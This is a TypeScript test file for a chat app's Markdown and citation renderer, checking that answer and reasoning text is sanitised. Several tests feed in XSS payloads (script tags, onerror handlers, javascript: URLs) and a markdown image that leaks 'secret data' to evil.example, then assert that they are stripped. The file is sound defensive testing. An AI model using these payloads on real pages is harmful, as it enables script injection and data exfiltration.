import { afterEach, describe, expect, it } from 'vitest';
import { renderAnswer, renderReasoning } from '@/shared/chat/markdown';
import type { MessageSource } from '@/shared/model';

// Sanitised Markdown and citation links (spec 5.6, 6 "Privacy", D13).

const SOURCES: MessageSource[] = [
  { index: 1, title: 'Night trains', url: 'https://news.example/trains', origin: 'pin' },
  { index: 3, title: 'Dashboard', url: 'https://dash.example/', origin: 'currentTab' },
];

const label = (n: number, title: string) => `Source ${String(n)}: ${title}`;

function html(text: string, sources = SOURCES): HTMLElement {
  const box = document.createElement('div');
  box.append(renderAnswer(text, sources, label));
  document.body.append(box);
  return box;
}

afterEach(() => {
  document.body.replaceChildren();
  delete (globalThis as Record<string, unknown>).pwned;
});

describe('Markdown', () => {
  it('renders lists, code, emphasis and tables', () => {
    const box = html(
      '# Title\n\n- one\n- **two**\n\n1. first\n\n```js\nconst a = [1];\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |',
    );
    expect(box.querySelector('h1')?.textContent).toBe('Title');
    expect(box.querySelectorAll('ul li')).toHaveLength(2);
    expect(box.querySelector('strong')?.textContent).toBe('two');
    expect(box.querySelector('ol li')?.textContent).toBe('first');
    expect(box.querySelector('pre code')?.textContent).toBe('const a = [1];\n');
    expect(box.querySelectorAll('table td')).toHaveLength(2);
  });

  it('opens links in a new tab without opener or referrer', () => {
    const box = html('See [the docs](https://docs.example/a) and <https://b.example/>.');
    const links = [...box.querySelectorAll('a')];
    expect(links).toHaveLength(2);
    for (const a of links) {
      expect(a.getAttribute('target')).toBe('_blank');
      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
      expect(a.className).toBe('external-link');
    }
    expect(links[0]?.getAttribute('href')).toBe('https://docs.example/a');
  });
});

describe('sanitiser', () => {
  it('drops scripts, event handlers and dangerous URLs', async () => {
    const box = html(
      [
        'Hello <script>globalThis.pwned = 1</script>',
        '<img src="x" onerror="globalThis.pwned = 2">',
        '<a href="javascript:globalThis.pwned=3">x</a>',
        '[y](javascript:globalThis.pwned=4)',
        '<iframe srcdoc="x"></iframe>',
        '<div onclick="globalThis.pwned=5" style="position:fixed">z</div>',
        '<svg><script>globalThis.pwned=6</script></svg>',
        '<form><button>b</button></form>',
      ].join('\n\n'),
    );
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(box.querySelector('script, img, iframe, svg, form, button, style')).toBeNull();
    for (const el of box.querySelectorAll('*')) {
      for (const attr of el.getAttributeNames()) {
        expect(attr.startsWith('on')).toBe(false);
        expect(attr).not.toBe('style');
      }
    }
    for (const a of box.querySelectorAll('a')) {
      expect(a.getAttribute('href') ?? '').not.toMatch(/javascript/i);
    }
    expect((globalThis as Record<string, unknown>).pwned).toBeUndefined();
  });

  it('never loads images: an image becomes its alt text', () => {
    const box = html('![secret data](https://evil.example/leak?q=1)');
    expect(box.querySelector('img')).toBeNull();
    expect(box.textContent).toContain('secret data');
    expect(box.innerHTML).not.toContain('evil.example');
  });
});

describe('citations', () => {
  const chips = (box: HTMLElement) => [
    ...box.querySelectorAll<HTMLButtonElement>('button.citation'),
  ];

  it('turns [n] into a button for the source with that number, without an address', () => {
    const box = html('Trains are back [1]. The dashboard agrees [3].');
    const buttons = chips(box);
    // The number only, no brackets (redesign spec 5.3).
    expect(buttons.map((b) => b.textContent)).toEqual(['1', '3']);
    expect(box.textContent.trim()).toBe('Trains are back 1. The dashboard agrees 3.');
    const first = buttons[0];
    expect(first?.type).toBe('button');
    expect(first?.dataset.citation).toBe('1');
    expect(first?.getAttribute('aria-label')).toBe('Source 1: Night trains');
    expect(first?.getAttribute('title')).toBe('Night trains');
    expect(buttons[1]?.dataset.citation).toBe('3');
    // Nothing a middle-click or Ctrl-click could follow by itself.
    expect(box.querySelector('a')).toBeNull();
    expect(box.innerHTML).not.toContain('news.example');
    for (const b of buttons) expect(b.hasAttribute('href')).toBe(false);
  });

  it('keeps numbers without a source as plain text', () => {
    const box = html('Unknown [2] and [99].');
    expect(box.querySelector('a, button')).toBeNull();
    expect(box.textContent.trim()).toBe('Unknown [2] and [99].');
  });

  it('makes a button for each number of a group', () => {
    const box = html('Both say so [1, 3] and [1][3], not [1, 2].');
    expect(chips(box).map((b) => b.dataset.citation)).toEqual(['1', '3', '1', '3', '1']);
    expect(chips(box).map((b) => b.textContent)).toEqual(['1', '3', '1', '3', '1']);
    // Chips stand side by side; a number without a source keeps its brackets.
    expect(box.textContent.trim()).toBe('Both say so 13 and 13, not 1[2].');
  });

  it('leaves code and links alone', () => {
    const box = html('`arr[1]` and\n\n```\nx[1]\n```\n\n[see [1]](https://a.example/)');
    expect(chips(box)).toHaveLength(0);
  });

  it('works inside lists and emphasis', () => {
    const box = html('- **Point** [1]\n- other [3]');
    expect(box.querySelectorAll('li button.citation')).toHaveLength(2);
  });

  it('keeps working with only stored sources (after unpinning)', () => {
    const box = html('Old answer [1].', [
      { index: 1, title: 'Gone pin', url: 'https://gone.example/', origin: 'pin' },
    ]);
    expect(chips(box)[0]?.dataset.citation).toBe('1');
  });

  it('makes no button for sources that are not web pages', () => {
    const box = html('See [1].', [
      { index: 1, title: 'x', url: 'javascript:alert(1)', origin: 'pin' },
    ]);
    expect(box.querySelector('a, button')).toBeNull();
  });
});

describe('citation lookalikes from model output', () => {
  it('strips forged citation attributes from HTML anchors and buttons', () => {
    const box = html(
      [
        '<a class="citation" data-citation="1" aria-label="Source 1: Night trains" title="Night trains" href="https://evil.example/a">[1]</a>',
        '<button class="citation" data-citation="1" aria-label="Source 1: Night trains">[1]</button>',
        '<span role="button" class="citation" data-citation="3" tabindex="0">[3]</span>',
      ].join(' '),
      [],
    );
    expect(
      box.querySelector('button, .citation, [data-citation], [aria-label], [role]'),
    ).toBeNull();
    for (const el of box.querySelectorAll('*')) {
      for (const attr of el.getAttributeNames()) {
        expect(attr.startsWith('data-')).toBe(false);
        expect(attr.startsWith('aria-')).toBe(false);
        expect(['role', 'tabindex', 'id']).not.toContain(attr);
      }
      // The only class is the one the renderer itself puts on links.
      if (el.className !== '') expect([el.tagName, el.className]).toEqual(['A', 'external-link']);
    }
    // The forged anchor is an ordinary external link, marked as one.
    const link = box.querySelector('a');
    expect(link?.className).toBe('external-link');
    expect(link?.getAttribute('title')).toBe('https://evil.example/a');
  });

  it('renders [[1]](https://…) as an external link, never as a citation', () => {
    const box = html('See [[1]](https://evil.example/x) and [1].');
    const link = box.querySelector('a');
    expect(link?.textContent).toBe('[1]');
    expect(link?.className).toBe('external-link');
    expect(link?.getAttribute('href')).toBe('https://evil.example/x');
    expect(link?.getAttribute('title')).toBe('https://evil.example/x');
    expect(link?.hasAttribute('data-citation')).toBe(false);
    expect(link?.hasAttribute('aria-label')).toBe(false);
    expect(link?.querySelector('button')).toBeNull();
    // Only the real [1] is a citation.
    const buttons = [...box.querySelectorAll('button.citation')];
    expect(buttons).toHaveLength(1);
    expect(buttons[0]?.closest('a')).toBeNull();
  });

  it("shows a link's real address as its tooltip, not the model's title", () => {
    const box = html('[Night trains](https://evil.example/y "Source 1: Night trains")');
    const link = box.querySelector('a');
    expect(link?.getAttribute('title')).toBe('https://evil.example/y');
    expect(link?.className).toBe('external-link');
  });

  it('gives genuine citations only to numbers in the stored source list', () => {
    const box = html('<a data-citation="9" href="https://evil.example/">[9]</a> [9]');
    expect(box.querySelector('button')).toBeNull();
  });
});

// The reasoning block (specs/thinking-levels.md 4.5): the same sanitiser,
// without citation linking.
describe('reasoning', () => {
  function reasoning(text: string): HTMLElement {
    const box = document.createElement('div');
    box.append(renderReasoning(text));
    document.body.append(box);
    return box;
  }

  it('renders Markdown like an answer', () => {
    const box = reasoning('First **weigh** both.\n\n- one\n- two\n\n`code`');
    expect(box.querySelector('strong')?.textContent).toBe('weigh');
    expect(box.querySelectorAll('ul li')).toHaveLength(2);
    expect(box.querySelector('code')?.textContent).toBe('code');
  });

  it('drops scripts, event handlers, dangerous URLs and anything that loads', async () => {
    const box = reasoning(
      [
        'Thinking <script>globalThis.pwned = 1</script>',
        '<img src="x" onerror="globalThis.pwned = 2">',
        '<a href="javascript:globalThis.pwned=3">x</a>',
        '[y](javascript:globalThis.pwned=4)',
        '<iframe srcdoc="x"></iframe>',
        '<div onclick="globalThis.pwned=5" style="position:fixed">z</div>',
        '<svg><script>globalThis.pwned=6</script></svg>',
        '<form><button>b</button></form>',
        '![secret data](https://evil.example/leak?q=1)',
      ].join('\n\n'),
    );
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(box.querySelector('script, img, iframe, svg, form, button, style')).toBeNull();
    for (const el of box.querySelectorAll('*')) {
      for (const attr of el.getAttributeNames()) {
        expect(attr.startsWith('on')).toBe(false);
        expect(attr).not.toBe('style');
      }
    }
    for (const a of box.querySelectorAll('a')) {
      expect(a.getAttribute('href') ?? '').not.toMatch(/javascript/i);
    }
    expect(box.innerHTML).not.toContain('evil.example');
    expect((globalThis as Record<string, unknown>).pwned).toBeUndefined();
  });

  it('marks links as external, like an answer does', () => {
    const link = reasoning('See [the docs](https://docs.example/a).').querySelector('a');
    expect(link?.className).toBe('external-link');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
    expect(link?.getAttribute('title')).toBe('https://docs.example/a');
  });

  it('never links citations: [n] stays text, and forged ones are stripped', () => {
    const box = reasoning(
      'Page [1] says so, [3] too. <button class="citation" data-citation="1">[1]</button>',
    );
    expect(box.querySelector('button, .citation, [data-citation], [aria-label]')).toBeNull();
    expect(box.textContent).toContain('Page [1] says so, [3] too.');
  });
});
